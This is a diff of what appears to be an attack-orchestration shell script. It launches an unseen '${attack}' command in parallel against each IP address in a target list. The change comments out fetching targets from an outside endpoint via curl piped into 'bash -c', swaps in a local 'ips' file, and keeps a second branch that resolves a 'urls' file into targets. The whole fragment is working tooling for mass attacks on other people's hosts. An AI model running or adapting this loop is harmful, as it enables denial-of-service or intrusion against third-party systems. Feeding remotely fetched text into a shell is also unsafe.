@@ -29,7 +29,10 @@ do
     # Execute two different attacks in parallel. One takes the source of IPs
     # from http://whats-alive.com/alive and another one uses the local `urls`
     # file to resolve IPs.
-    curl --max-time 60 http://whats-alive.com/alive | xargs -n1 -I % bash -c "${attack}" &
+
+    # TODO: Uncomment and remove the `ips` file when the endpoint works again.
+    # curl --max-time 60 http://whats-alive.com/alive | xargs -n1 -I % bash -c "${attack}" &
+    cat ips | xargs -n1 -I % bash -c "${attack}" &
     cat urls | xargs -n1 -I % bash -c 'node ip-lookup.mjs %' | xargs -n1 -I % bash -c "${attack}" & 
     wait
   fi
